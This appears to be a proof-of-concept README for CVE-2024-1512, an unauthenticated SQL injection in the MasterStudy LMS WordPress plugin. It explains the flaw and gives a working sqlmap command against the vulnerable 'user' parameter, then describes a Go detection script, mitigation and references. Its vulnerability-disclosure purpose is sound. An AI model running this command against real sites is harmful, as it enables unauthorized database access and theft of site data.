# CVE-2024-1512 Proof of Concept

## Vulnerability Overview

CVE-2024-1512 exposes a critical vulnerability in the MasterStudy LMS WordPress Plugin, specifically within the implementation of the /lms/stm-lms/order/items REST route. The issue arises from the plugin's failure to properly escape the 'user' parameter, combined with an inadequate preparation of SQL queries. As a result, attackers can inject malicious SQL code into the query by manipulating the 'user' parameter. This vulnerability facilitates a union-based SQL Injection attack, whereby an attacker appends additional SQL commands to the original query, enabling unauthorized database interactions. These interactions could include data extraction, data deletion, or data manipulation, posing a significant risk to the confidentiality, integrity, and availability of the data. The exploitation of this vulnerability does not require authentication, making it particularly dangerous as it can be attempted by any remote attacker who can send HTTP requests to the affected site.

## Proof of Concept (PoC)
Exploit with sqlmap, by replacing http://example.com with the target URL.
```bash
sqlmap -u 'http://example.com/?rest_route=/lms/stm-lms/order/items&author_id=111&user=555' --dbs --batch -p user
```

### Detection
The Go script provided in repository can be used to detect the presence of this vulnerability by timing the response to a crafted SQL injection payload. The tool constructs a URL by appending a SQL injection payload to the base URL provided as an argument. It then makes an HTTP GET request to this URL. If the response time is significantly longer than usual (the example uses 5 seconds as a benchmark), it suggests that the SQL injection attempt might have succeeded, indicating a potential vulnerability.
```go
go run main.go http://example.com
```

## Mitigation
Update the MasterStudy LMS WordPress Plugin to a version later than 3.2.5, where this vulnerability has been addressed. Always validate and sanitize input parameters rigorously to prevent SQL injection vulnerabilities.

## References
NVD - CVE-2024-1512 Detail  
Tenable - CVE-2024-1512  
Wordfence Security Advisory - MasterStudy LMS Plugin Vulnerability  
